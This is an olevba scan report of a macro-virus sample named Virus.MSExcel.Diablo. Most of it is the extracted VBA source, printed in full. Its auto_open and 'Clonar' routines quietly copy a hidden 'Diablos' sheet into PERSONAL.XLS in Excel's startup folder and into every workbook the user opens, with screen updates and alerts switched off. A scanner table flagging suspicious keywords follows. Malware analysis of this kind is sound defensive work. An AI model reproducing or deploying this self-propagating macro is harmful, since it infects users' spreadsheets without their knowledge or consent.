olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EsteLibro.cls 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/EsteLibro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja3.cls 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja4.cls 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Diablos.bas 
in file: Virus.MSExcel.Diablo-b97d3cfc12b99e511f8feb0c7dda163ccdd5a049 - OLE stream: '_VBA_PROJECT_CUR/VBA/Diablos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


' Diablos Macro
' Bios Virus Macro - (C) Copyright 1998/1999 - Spalaci

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo ErrorHandler1
    MkDir (Application.StartupPath)
    On Error GoTo 0
    GoTo ErrorHandler1
ErrorHandler1:
Application.OnSheetActivate = "Clonar"
End Sub

Sub Clonar()
Attribute Clonar.VB_ProcData.VB_Invoke_Func = " \n14"
 On Error GoTo ErrorHandler2
 Application.ScreenUpdating = False
 Application.DisplayAlerts = False

install = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
   If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then install = 1
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
      Workbooks(ThisWorkbook.Name).Sheets("Diablos").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Visible = False
      Workbooks("PERSONAL.XLS").Save
      Windows("PERSONAL.XLS").Visible = False
   End If
Else
   Windows("PERSONAL.XLS").Visible = False
   For i = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
       If Workbooks(ActiveWorkbook.Name).Sheets(i).Name = "Diablos" Then install = 1
   Next
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
      Workbooks(ActiveWorkbook.Name).Sheets("Diablos").Visible = False
      Workbooks(ActiveWorkbook.Name).Save
      Windows("PERSONAL.XLS").Visible = False
   End If
End If
 Workbooks("PERSONAL.XLS").Save
 Application.ScreenUpdating = True
 Application.DisplayAlerts = True
 If Day(Now()) = Int((31 * Rnd) + 1) Then CommandBars.LargeButtons = True
ErrorHandler2:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Diablo
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CLAUSTRO_DATO
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CLAUSTRO_RESULTAD
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CENTRO_DATO
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CENTRO_RESULTAD
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SECRETARÍA
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  RESULTADO
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

